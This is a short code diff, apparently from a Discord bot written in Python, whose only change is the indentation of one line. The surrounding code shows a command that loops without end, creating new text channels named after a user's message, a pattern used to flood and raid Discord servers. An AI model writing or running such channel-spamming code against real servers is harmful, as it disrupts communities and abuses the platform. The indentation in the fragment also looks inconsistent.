@@ -64,7 +64,7 @@ async def c(ctx, *, message):
   for i in range(1):
      print("Created")
    while True:
-           for channel in guild.text_channels:
+          for channel in guild.text_channels:
               await guild.create_text_channel(f"{message}")
 
 client.run(token)
